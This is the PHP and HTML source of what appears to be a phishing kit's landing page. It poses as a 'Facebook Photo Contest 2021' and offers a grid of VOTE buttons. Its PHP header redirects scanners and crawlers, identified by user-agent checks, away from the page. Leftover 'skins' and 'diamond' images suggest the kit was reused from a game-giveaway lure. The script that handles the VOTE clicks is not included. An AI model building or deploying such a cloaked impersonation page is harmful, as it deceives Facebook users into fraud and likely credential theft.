<?php 
session_start();
session_destroy();

$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.facebook.com/IdhamDotID');
die();
}

?>
<!doctype html>
<html lang="en">
    <head>
        <script src="./removeBanner.js"></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
        <link rel="stylesheet" href="static/css/style.css">
        <title>Facebook Photo Contest 2021</title>
        <link rel="shorcut icon" href="11.png">
    </head>
    <body>
        <div class="mobile">
            <div class="navbar">
                <img src="12.png">
                <div class="text-left text-white text-header">
                    Facebook Photo<br>
                    <span>Contest 2021</span>
                </div>
            </div>
            <div class="row">
                <div class="col-md-12 col-12">
                    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
                        <ol class="carousel-indicators">
                            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
                            <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
                        </ol>
                        <div class="carousel-inner">
                            <div class="carousel-item active">
                                <img src="1b.jpeg?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="2b.jpeg?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                            <div class="carousel-item">
                                <img src="3b.jpeg?width=572&amp;height=269" class="d-block w-100" alt="...">
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-12 col-12 mt-3">
                    <div class="btnCategory">
                        <div class="row mx-auto">
                            <div class="col-md-6 col-6">
                                <button class="btn btn-sm btn-primary d-block mx-auto active" id="sk"><i class="zmdi zmdi-card-giftcard mr-1"></i> Girls</button>
                            </div>
                            <div class="col-md-6 col-6">
                                <button class="btn btn-sm btn-primary d-block mx-auto" id="dm"><i class="zmdi zmdi-card-giftcard mr-1"></i> Boys</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="row mt-1 mb-1">
                <div class="col-md-12 col-12">
                    <div class="clearfix"></div>
                </div>
            </div>

            <div class="scroll" id="skin">
                <div class="row px-3 mt-2">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="tastas.gif" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="snow.gif" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="fire.gif" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>
                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/4.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="v6-1.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/6.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="v6-2.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/8.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="2-skin.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/10.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/11.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/12.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/13.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/14.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/15.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/16.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/17.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/18.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-3">
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/19.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/20.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-4 col-4 d-inline mx-auto">
                        <div class="reward-box">
                            <img src="static/img/skins/21.jpeg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-danger d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-2 mb-5">
                    &nbsp;<br>&nbsp;<br>&nbsp;
                </div>
            </div>

            <!-- Diamond Box -->

            <div class="scroll" id="diamonds">
                <div class="row px-3 mt-2">
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/5000.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/2500.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-2">
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/1500.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/1000.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-2">
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/500.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                    <div class="col-md-6 col-6 d-inline mx-auto">
                        <div class="reward-box2">
                            <img src="static/img/diamond/250.jpg" class="d-block mx-auto" alt="">
                            <button class="btn btn-sm btn-info d-block mx-auto"><i class="zmdi zmdi-card-giftcard mr-1"></i> VOTE</button>
                        </div>
                    </div>
                </div>

                <div class="row px-3 mt-2 mb-5">
                    &nbsp;<br>&nbsp;<br>&nbsp;
                </div>
            </div>
        </div>

        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
        <script src="static/js/index.js"></script>
    </body>
</html>
